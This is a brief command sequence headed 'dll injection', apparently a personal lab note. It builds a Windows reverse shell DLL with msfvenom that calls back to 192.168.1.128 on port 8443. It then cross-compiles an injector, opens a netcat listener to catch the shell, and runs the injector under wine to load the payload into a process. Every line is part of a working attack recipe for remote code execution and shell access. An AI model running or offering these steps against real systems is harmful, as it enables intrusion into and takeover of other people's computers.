///////////////////
// dll injection
///////////////////
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.128 LPORT=8443 -f dll -o mylib.dll
x86_64-w64-mingw32-g++ dll_injection.cpp -o dll_injection.exe -luser32 -lkernel32 -static -std=c++26
nc -lvp 8443
wine dll_injection.exe 32 mylib.dll